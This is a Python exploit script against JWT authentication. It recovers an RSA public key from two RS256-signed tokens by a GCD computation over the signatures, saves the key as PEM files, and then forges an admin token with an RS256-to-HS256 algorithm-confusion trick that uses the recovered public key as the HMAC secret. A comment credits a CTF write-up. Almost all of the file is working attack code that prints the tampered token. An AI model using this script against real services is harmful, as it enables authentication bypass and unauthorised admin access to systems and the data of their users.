import sys
import jwt
import json
import base64
from gmpy2 import mpz,gcd,c_div
import binascii
from Crypto.Hash import SHA256
from Crypto.Signature import PKCS1_v1_5 # god bless http://ratmirkarabut.com/articles/ctf-writeup-google-ctf-quals-2017-rsa-ctf-challenge/
import asn1tools
import binascii
import time
import hmac
import hashlib

def b64urldecode(b64):
    return base64.urlsafe_b64decode(b64+("="*(len(b64) % 4)))

def b64urlencode(m):
    return base64.urlsafe_b64encode(m).strip(b"=")

def bytes2mpz(b):
    return mpz(int(binascii.hexlify(b),16))


def der2pem(der, token="RSA PUBLIC KEY"):
    der_b64=base64.b64encode(der).decode('ascii')
    
    lines=[ der_b64[i:i+64] for i in range(0, len(der_b64), 64) ]
    return "-----BEGIN %s-----\n%s\n-----END %s-----" % (token, "\n".join(lines), token)


def forge_mac(jwt0, public_key):
    jwt0_parts=jwt0.encode('utf8').split(b'.')
    jwt0_msg=b'.'.join(jwt0_parts[0:2])

    alg=b64urldecode(jwt0_parts[0].decode('utf8'))
    alg_tampered=b64urlencode(alg.replace(b"RS256",b"HS256"))

    payload=json.loads(b64urldecode(jwt0_parts[1].decode('utf8')))
    payload['exp'] = int(time.time())+86400
    payload_encoded=b64urlencode(json.dumps({"username": "admin","is_admin": True}).encode('utf8'))

    tamper_hmac=b64urlencode(hmac.HMAC(public_key,b'.'.join([alg_tampered, payload_encoded]),hashlib.sha256).digest())

    jwt0_tampered=b'.'.join([alg_tampered, payload_encoded, tamper_hmac])
    print("[+] Tampered JWT: %s" % (jwt0_tampered))

# e=mpz(65537) # Can be a couple of other common values

jwt0=sys.argv[1]
jwt1=sys.argv[2]


jwt0_sig_bytes = b64urldecode(jwt0.split('.')[2])
jwt1_sig_bytes = b64urldecode(jwt1.split('.')[2])
if len(jwt0_sig_bytes) != len(jwt1_sig_bytes):
    raise Exception("Signature length mismatch") # Based on the mod exp operation alone, there may be some differences!

jwt0_sig = bytes2mpz(jwt0_sig_bytes)
jwt1_sig = bytes2mpz(jwt1_sig_bytes)

jks0_input = ".".join(jwt0.split('.')[0:2])
sha256_0=SHA256.new(jks0_input.encode('ascii'))
padded0 = PKCS1_v1_5.EMSA_PKCS1_V1_5_ENCODE(sha256_0, len(jwt0_sig_bytes))

jks1_input = ".".join(jwt1.split('.')[0:2])
sha256_1=SHA256.new(jks1_input.encode('ascii'))
padded1 = PKCS1_v1_5.EMSA_PKCS1_V1_5_ENCODE(sha256_1, len(jwt0_sig_bytes))

m0 = bytes2mpz(padded0) 
m1 = bytes2mpz(padded1)

pkcs1 = asn1tools.compile_files('pkcs1.asn', codec='der')
x509 = asn1tools.compile_files('x509.asn', codec='der')

for e in [mpz(3),mpz(65537)]:
    gcd_res = gcd(pow(jwt0_sig, e)-m0,pow(jwt1_sig, e)-m1)
    print("[*] GCD: ",hex(gcd_res))
    for my_gcd in range(1,100):
        my_n=c_div(gcd_res, mpz(my_gcd))
        if pow(jwt0_sig, e, my_n) == m0:
            print("[+] Found n with multiplier" ,my_gcd, " :\n", hex(my_n))
            pkcs1_pubkey=pkcs1.encode("RSAPublicKey", {"modulus": int(my_n), "publicExponent": int(e)})
            x509_der=x509.encode("PublicKeyInfo",{"publicKeyAlgorithm":{"algorithm":"1.2.840.113549.1.1.1","parameters":None},"publicKey":(pkcs1_pubkey, len(pkcs1_pubkey)*8)})
            pem_name = "%s_%d_x509.pem" % (hex(my_n)[2:18], e)
            with open(pem_name, "wb") as pem_out:
                public_key=der2pem(x509_der, token="PUBLIC KEY").encode('ascii')
                pem_out.write(public_key)
                print("[+] Written to %s" % (pem_name))
                forge_mac(jwt0, public_key)
            pem_name = "%s_%d_pkcs1.pem" % (hex(my_n)[2:18], e)
            with open(pem_name, "wb") as pem_out:
                public_key=der2pem(pkcs1_pubkey).encode('ascii')
                pem_out.write(public_key)
                print("[+] Written to %s" % (pem_name))
                forge_mac(jwt0, public_key)
